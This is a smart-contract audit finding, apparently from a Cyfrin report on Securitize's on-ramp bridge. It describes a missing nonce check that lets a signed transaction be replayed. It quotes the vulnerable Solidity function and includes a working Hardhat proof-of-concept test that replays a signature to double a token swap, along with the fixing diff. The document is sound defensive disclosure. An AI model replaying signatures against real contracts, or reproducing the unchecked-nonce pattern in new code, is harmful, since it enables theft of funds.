---
tags:
  - lang/solidity
  - sector/bridge
  - sector/stable
  - platform/cyfrin
  - has/github
  - has/poc
  - severity/high
  - vuln/bridge/replay
  - novelty/variant
  - misassumption/bridge-is-secure
  - misassumption/signature-is-unique
  - fix/add-nonce
  - trigger/cross-chain-message
protocol: "[[Securitize]]"
auditors:
  - "[[Hans]]"
report: "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-07-23-cyfrin-securitize-onofframp-bridge-v2.1.md"
genome:
  - "[[replay]]"
  - "[[direct-drain]]"
  - "[[variant]]"
  - "[[bridge-message-validation]]"
  - "[[permit-fork-replay]]"
---
# Missing nonce validation in signature verification allows transaction replay attacks

- id: 64270
- impact: HIGH
- protocol: [[Securitize]] Onofframp Bridge
- reporter: Hans (Cyfrin)
- source: https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-07-23-cyfrin-securitize-onofframp-bridge-v2.1.md

## Summary


This bug report describes a vulnerability in the `SecuritizeOnRamp::executePreApprovedTransaction` function. This function does not properly validate the nonce provided in the transaction data, allowing for replay attacks where old valid transactions can be repeated. This can lead to unintended token swaps and accounting failure. The report includes a proof of concept and recommends adding nonce validation before executing the transaction to mitigate the vulnerability. The bug has been fixed in the latest commit and has been verified by Cyfrin. 

## Details

**Description:** The `SecuritizeOnRamp::executePreApprovedTransaction` function fails to validate that the nonce provided in the transaction data matches the expected nonce for the investor before executing the transaction. While the function verifies the EIP-712 signature includes the nonce as part of the signed message, it does not check if `txData.nonce` equals the current `noncePerInvestor[txData.senderInvestor]` value. The function only increments the stored nonce after signature verification, allowing old valid signatures to be replayed with their original nonce values.

The current implementation at lines 184-199 in `SecuritizeOnRamp.sol`:
```solidity
function executePreApprovedTransaction(
    bytes memory signature,
    ExecutePreApprovedTransaction calldata txData
) public override whenNotPaused {
    bytes32 digest = hashTx(txData);
    address signer = ECDSA.recover(digest, signature);

    // Check recovered address role
    IDSTrustService trustService = IDSTrustService(dsToken.getDSService(dsToken.TRUST_SERVICE()));
    uint256 signerRole = trustService.getRole(signer);
    if (signerRole != trustService.EXCHANGE() && signerRole != trustService.ISSUER()) {
        revert InvalidEIP712SignatureError();
    }
    noncePerInvestor[txData.senderInvestor] = noncePerInvestor[txData.senderInvestor] + 1;
    Address.functionCall(txData.destination, txData.data);
}
```

This vulnerability allows an attacker to replay any previously valid signed transaction, potentially executing multiple subscriptions or other operations with the same signature.

**Impact:** Attackers can replay previously valid EIP-712 signed transactions to execute duplicate subscription operations, leading to unintended token swaps and accounting failure.

**Proof Of Concept:**
Add the PoC below to `on-ramp.test.ts`.
```typescript
  it('Should allow replay attack - nonce not validated properly', async function () {
      // Setup initial balances and approvals for multiple transactions
      await usdcMock.mint(unknownWallet, 2e6); // Mint 2M USDC for two transactions
      await dsTokenMock.issueTokens(assetProviderWallet, 2e6); // Issue 2e6 DS tokens

      const liquidityFromInvestor = usdcMock.connect(unknownWallet) as Contract;
      await liquidityFromInvestor.approve(onRamp, 2e6); // Approve 2 USDC

      const dsTokenFromAssetProviderWallet = dsTokenMock.connect(assetProviderWallet) as Contract;
      await dsTokenFromAssetProviderWallet.approve(assetProvider, 2e6); // Approve 2e6 DS tokens

      const calculatedDSTokenAmount = await onRamp.calculateDsTokenAmount(1e6);

      // Create first transaction with nonce 0
      const subscribeParams = [
          '1',
          await unknownWallet.getAddress(),
          'US',
          [],
          [],
          [],
          980000,
          1e6,
          blockNumber + 10,
          HASH,
      ];
      const txData = await buildTypedData(onRamp, subscribeParams);
      const signature = await eip712OnRamp(eip712Signer, await onRamp.getAddress(), txData);

      // Verify initial nonce is 0
      expect(await onRamp.nonceByInvestor('1')).to.equal(0);

      // Execute first transaction successfully
      await expect(onRamp.executePreApprovedTransaction(signature, txData))
          .emit(onRamp, 'Swap')
          .withArgs(onRamp, calculatedDSTokenAmount, 1e6, unknownWallet);

      // Verify nonce is now 1 after first transaction
      expect(await onRamp.nonceByInvestor('1')).to.equal(1);

      // Verify first transaction effects
      expect(await dsTokenMock.balanceOf(unknownWallet)).to.equal(calculatedDSTokenAmount);
      expect(await usdcMock.balanceOf(unknownWallet)).to.equal(1e6); // 1e6 remaining

      // VULNERABILITY: Replay the same transaction with the same signature and nonce 0
      // This should fail but doesn't because nonce validation is missing
      await expect(onRamp.executePreApprovedTransaction(signature, txData))
          .emit(onRamp, 'Swap')
          .withArgs(onRamp, calculatedDSTokenAmount, 1e6, unknownWallet);

      // Verify the replay attack succeeded - investor got double the tokens
      expect(await dsTokenMock.balanceOf(unknownWallet)).to.equal(calculatedDSTokenAmount * 2n);
      expect(await usdcMock.balanceOf(unknownWallet)).to.equal(0); // All USDC spent

      // Verify nonce was incremented again (now 2) even though we replayed nonce 0
      expect(await onRamp.nonceByInvestor('1')).to.equal(2);
  });
```
**Recommended Mitigation:** Add nonce validation before executing the transaction to ensure the provided nonce matches the expected nonce for the investor:

```diff
function executePreApprovedTransaction(
    bytes memory signature,
    ExecutePreApprovedTransaction calldata txData
) public override whenNotPaused {
+   // Validate nonce matches expected value
+   if (txData.nonce != noncePerInvestor[txData.senderInvestor]) {
+       revert InvalidEIP712SignatureError();
+   }
+
    bytes32 digest = hashTx(txData);
    address signer = ECDSA.recover(digest, signature);

    // Check recovered address role
    IDSTrustService trustService = IDSTrustService(dsToken.getDSService(dsToken.TRUST_SERVICE()));
    uint256 signerRole = trustService.getRole(signer);
    if (signerRole != trustService.EXCHANGE() && signerRole != trustService.ISSUER()) {
        revert InvalidEIP712SignatureError();
    }
    noncePerInvestor[txData.senderInvestor] = noncePerInvestor[txData.senderInvestor] + 1;
    Address.functionCall(txData.destination, txData.data);
}
```

**Securitize:** Fixed in commit [65179b](https://github.com/securitize-io/bc-on-off-ramp-sc/commit/65179bcf41ed859106069dcaa751f5a2cec3038e).

**Cyfrin:** Verified.

\clearpage
